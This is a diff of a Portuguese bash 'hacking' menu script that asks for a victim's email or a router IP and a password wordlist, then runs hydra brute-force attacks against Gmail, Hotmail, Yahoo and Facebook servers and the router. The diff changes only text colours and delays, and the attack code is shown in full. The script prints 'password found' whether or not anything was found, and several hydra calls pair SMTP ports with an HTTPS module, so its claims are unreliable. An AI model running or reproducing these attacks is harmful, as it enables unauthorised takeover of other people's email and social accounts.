@@ -30,72 +30,69 @@ read -p "[+]>>" opcao
 #
 #Invadir roteador
 if [ "$opcao" = "1" ];then
-echo "\033[1;31mINFORME O IP DO SEU ROTEADOR"; sleep 2
+echo "\033[1;36mINFORME O IP DO SEU ROTEADOR"; sleep 1
 read -p "[+]=>" ip
 echo
-echo "\033[1;31mINFORME O USER DO SEU ROTEADOR"; sleep 2
+echo "\033[1;36mINFORME O USER DO SEU ROTEADOR"; sleep 1
 read -p "[+]=>" user
 echo
-echo "\033[1;31mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 2
+echo "\033[1;36mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 1
 read -p "[+]=>" wordlist
 echo 
- echo "\033[1;31mINVADINDO ROTEADOR..."; sleep 2
+ echo "\033[1;36mINVADINDO ROTEADOR..."; sleep 1
 hydra -l $user -P $wordlist -V $ip http-get
 fi
 #Invadir Gmail
 if [ "$opcao" = "2" ];then
 echo
-echo "\033[1;31mINFORME O EMAIL DA VÍTIMA"; sleep 2
+echo "\033[1;36mINFORME O EMAIL DA VÍTIMA"; sleep 1
 read -p "[+]>>" email
 echo
-echo "\033[1;31mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 2
+echo "\033[1;36mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 1
 read -p "[+]>>" lista
 echo
- echo "\033[1;31mCOMEÇANDO A INVASÃO..."; sleep 2
+ echo "\033[1;36mCOMEÇANDO A INVASÃO..."; sleep 1
 hydra -l $email -P $lista -s 465 smtp.gmail.com https-get
-echo "\033[1;31mSENHA ENCONTRADA!"; sleep 2
+echo "\033[1;31mSENHA ENCONTRADA!"; sleep 1
 fi
 #Invadir HOTMAIL
 if [ "$opcao" = "3" ];then
 echo
-echo "\033[1;31mINFORME O EMAIL DA VÍTIMA"; sleep 2
+echo "\033[1;36mINFORME O EMAIL DA VÍTIMA"; sleep 1
 read -p "[+]>>" email
 echo
-echo "\033[1;31mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; 
-sleep 2
+echo "\033[1;36mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 2
 read -p "[+]>>" lista
 echo
- echo "\033[1;31mCOMEÇANDO A INVASÃO..."; sleep 2
+ echo "\033[1;36mCOMEÇANDO A INVASÃO..."; sleep 1
 hydra -l $email -P $lista -s 587 smtp.live.com https-get
-echo "\033[1;31mSENHA ENCONTRADA!"; sleep 3
+echo "\033[1;36mSENHA ENCONTRADA!"; sleep 1
 fi
 #Invadir YAHOO
 if [ "$opcao" = "4" ];then
 echo
-echo "\033[1;31mINFORME O EMAIL DA VÍTIMA"; sleep 2
+echo "\033[1;36mINFORME O EMAIL DA VÍTIMA"; sleep 1
 read -p "[+]>>" email
 echo
-echo "\033[1;31mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; 
-sleep 2
+echo "\033[1;36mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 1
 read -p "[+]>>" lista
 echo
- echo "\033[1;31mCOMEÇANDO A INVASÃO..."; sleep 2
+ echo "\033[1;36mCOMEÇANDO A INVASÃO..."; sleep 1
 hydra -l $email -P $lista -s 465 smtp.mail.yahoo.com https-get
-echo "\033[1;31mSENHA ENCONTRADA!"; sleep 3
+echo "\033[1;36mSENHA ENCONTRADA!"; sleep 1
 fi
 #Invadir FACEBOOK
 if [ "$opcao" = "5" ];then
 echo
-echo "\033[1;31mINFORME O EMAIL DA VÍTIMA"; sleep 2
+echo "\033[1;36mINFORME O EMAIL DA VÍTIMA"; sleep 1
 read -p "[+]>>" email
 echo
-echo "\033[1;31mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; 
-sleep 2
+echo "\033[1;36mINFORME O DIRETÓRIO DA SUA LISTA DESENHA"; sleep 1
 read -p "[+]>>" lista
 echo
- echo "\033[1;31mCOMEÇANDO A INVASÃO..."; sleep 2
+ echo "\033[1;36mCOMEÇANDO A INVASÃO..."; sleep 1
 hydra -l $email -P $lista -f www.facebook.com https-get
-echo "\033[1;31mSENHA ENCONTRADA!"; sleep 3
+echo "\033[1;36mSENHA ENCONTRADA!"; sleep 3
 fi
 #
 #Fazendo o programa dormir por 4 segundos
